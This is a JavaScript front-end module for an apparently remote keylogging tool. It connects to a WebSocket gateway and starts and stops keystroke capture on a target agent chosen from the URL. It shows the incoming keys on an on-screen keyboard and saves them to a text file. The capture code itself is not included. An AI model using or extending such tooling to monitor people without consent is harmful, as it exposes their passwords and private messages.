import * as Logic from './logic.js';

const bracketMap = {
    '[return]': 'enter',
    '[caps]': 'caps',
    '[l-shift]': { text: 'shift', side: 'left' },
    '[r-shift]': { text: 'shift', side: 'right' },
    '[l-ctrl]':  { text: 'ctrl',  side: 'left' },
    '[r-ctrl]':  { text: 'ctrl',  side: 'right' },
    '[l-alt]':   { text: 'alt',   side: 'left' },
    '[r-alt]':   { text: 'alt',   side: 'right' },
    '[l-cmd]':   { text: 'win',   side: 'left' },
    '[r-cmd]':   { text: 'win',   side: 'right' },
    '[delete]': 'backspace',
    '[tab]': 'tab',
    '[esc]': 'esc',
    '[up]': '↑',
    '[down]': '↓',
    '[left]': '<-',
    '[right]': '->',
    '[fn]' : 'fn',
    '[f1]': 'f1', '[f2]': 'f2', '[f3]': 'f3', '[f4]': 'f4',
    '[f5]': 'f5', '[f6]': 'f6', '[f7]': 'f7', '[f8]': 'f8',
    '[f9]': 'f9', '[f10]': 'f10', '[f11]': 'f11', '[f12]': 'f12'
};

class KeyloggerUI {
    constructor() {
        this.isLogging = false;
        this.logBuffer = "";
        this.originalOnKeylog = null;

        this.displayInput = document.getElementById('keylog-panel');
        this.btnMenu = document.querySelector('.btn-menu');
        this.btnStart = document.querySelector('.btn-start');
        this.btnStop = document.querySelector('.btn-stop');
        this.btnSave = document.querySelector('.btn-save');
        this.keys = document.querySelectorAll('.key');

        this.init();
    }

    init() {
        const waitForGateway = () => {
            if (!window.gateway) {
                setTimeout(waitForGateway, 100);
                return;
            }

            this.originalOnKeylog = window.gateway.callbacks?.onKeylog;
            
            window.gateway.callbacks.onKeylog = (data, senderId) => {
                this.handleIncomingKey(data, senderId);
            };

            if (this.btnMenu) this.btnMenu.addEventListener('click', () => { window.location.href = 'Feature_menu.html'; });
            if (this.btnStart) this.btnStart.onclick = () => this.startKeylog();
            if (this.btnStop) this.btnStop.onclick = () => this.stopKeylog();
            if (this.btnSave) this.btnSave.onclick = () => this.saveToDevice();

            this.injectActiveStyle();
            Logic.initAgentTargetFromURL();
            this.logSystem("Ready. Press 'Start keylog' to begin.");
        };

        waitForGateway();
    }


    startKeylog() {
        if (!window.gateway || !window.gateway.ws || window.gateway.ws.readyState !== WebSocket.OPEN) {
            alert("Chưa kết nối Gateway! Vui lòng đợi kết nối...");
            return;
        }

        if (!window.gateway.isAuthenticated) {
            Logic.authenticate();
            setTimeout(() => this.startKeylog(), 500);
            return;
        }

        this.isLogging = true;
        Logic.startKeylog(0.05);
        
        if (this.btnStart) {
            this.btnStart.style.backgroundColor = "#22c55e"; 
            this.btnStart.innerText = "Monitoring...";
        }
    }

    stopKeylog() {
        if (!window.gateway) return;

        this.isLogging = false;
        Logic.stopKeylog();
        
        if (this.btnStart) {
            this.btnStart.style.backgroundColor = ""; 
            this.btnStart.innerText = "Start keylog";
        }
    }

    handleIncomingKey(data, senderId) {
        if (!this.isLogging) return;

        if (Array.isArray(data)) {
            let batchText = "";
            const normalizedKeys = [];
            
            data.forEach(keyToken => {
                const normalizedChar = this.normalizeKey(keyToken);
                normalizedKeys.push({ raw: keyToken, normalized: normalizedChar });
                batchText += normalizedChar;
            });
            
            this.logBuffer += batchText;
            this.updateDisplayBatch(batchText);
            
            normalizedKeys.forEach(({ raw, normalized }) => {
                this.visualizeKey(raw, normalized);
            });
            return;
        }

        const processed = Logic.processKeylogData(data, senderId);
        if (processed.processed && processed.chars) {
            let batchText = "";
            processed.chars.forEach(char => {
                batchText += char;
            });
            this.logBuffer += batchText;
            this.updateDisplayBatch(batchText);
            processed.chars.forEach(char => {
                this.visualizeKey(char, char);
            });
        }
    }

    normalizeKey(token) {
        if (token && token.startsWith("[") && token.endsWith("]")) {
            return token;
        }
        switch (token) {
            case "\x1b": return "[ESC]";
            case "\n": return "[RETURN]";
            case " ": return " ";
            default: return token || "";
        }
    }

    updateDisplay(char) {
        if (!this.displayInput) return;

        if (char === "[BACK]" || char === "[DELETE]") {
            this.displayInput.value += "[BACK]";
        } else if (char === "[RETURN]" || char === "[ENTER]") {
            this.displayInput.value += "[RETURN]";
        } else if (char === '\n' || char === '\r') {
            this.displayInput.value += "[RETURN]";
        } else if (char === '\t') {
            this.displayInput.value += "→ ";
        } else if (char) {
            this.displayInput.value += char;
        }
        
        this.displayInput.scrollTop = this.displayInput.scrollHeight;
    }

    updateDisplayBatch(batchText) {
        if (!this.displayInput || !batchText) return;

        let displayText = batchText
            .replace(/\[BACK\]|\[DELETE\]/g, "[BACK]")
            .replace(/\[RETURN\]|\[ENTER\]/g, "[RETURN]")
            .replace(/\n|\r/g, "[RETURN]")
            .replace(/\t/g, "→ ");

        this.displayInput.value += displayText;
        this.displayInput.scrollTop = this.displayInput.scrollHeight;
    }

    visualizeKey(rawToken, displayChar) {
        let targetKey = null;
        let info = null;
        //const lowerChar = displayChar ? displayChar.toLowerCase() : '';

        if (rawToken && rawToken.startsWith('[') && rawToken.endsWith(']')) {
            info = bracketMap[rawToken.toLowerCase()];
        }

        if (info && typeof info == 'object') {
            const allMatchingKeys = Array.from(this.keys).filter(k =>
                k.innerText.toLowerCase().trim() === info.text
            );

            if (info.side === 'left') targetKey = allMatchingKeys[0];
            else targetKey = allMatchingKeys[allMatchingKeys.length - 1];
        } else {
            let searchText =  info || (displayChar ? displayChar.toLowerCase() : '');

            if (searchText.startsWith('[') && searchText.endsWith(']')) {
                searchText = searchText.slice(1, -1);
            }

            if (!searchText) return;

            for (let key of this.keys) {
                let keyText = key.innerText.toLowerCase().trim();
                if (keyText === searchText || (searchText === ' ' && key.classList.contains('k-6-25'))) {
                    targetKey = key;
                    break;
                }
            }
        }

        if (targetKey) {
            targetKey.classList.remove('active-simulation');
            void targetKey.offsetWidth;
            targetKey.classList.add('active-simulation');
            setTimeout(() => {
                targetKey.classList.remove('active-simulation');
            }, 200);
        }
    }

    saveToDevice() {
        if (!this.logBuffer) {
            alert("Chưa có dữ liệu để lưu!");
            return;
        }

        const blob = new Blob([this.logBuffer], { type: "text/plain" });
        const url = URL.createObjectURL(blob);
        const a = document.createElement("a");
        
        const timestamp = new Date().toISOString().replace(/[:.]/g, "-");
        a.href = url;
        a.download = `keylog_${timestamp}.txt`;
        document.body.appendChild(a);
        a.click();
        
        document.body.removeChild(a);
        URL.revokeObjectURL(url);

        this.logBuffer = "";
        if (this.displayInput) {
            this.displayInput.value = "";
        }

        this.logSystem(">>> Log saved & cleared.");
    }

    logSystem(msg) {
        console.log(`[KeylogUI] ${msg}`);
    }

    injectActiveStyle() {
        const style = document.createElement('style');
        style.innerHTML = `
            .key.active-simulation {
                background-color: #E57D36 !important;
                color: #fff !important;
                transform: translateY(2px);
                box-shadow: 0 0 10px rgba(229, 125, 54, 0.5) !important;
                transition: all 0.05s ease;
                border-color: #E57D36 !important;
            }
        `;
        document.head.appendChild(style);
    }
}

document.addEventListener('DOMContentLoaded', () => {
    window.keyloggerApp = new KeyloggerUI();
});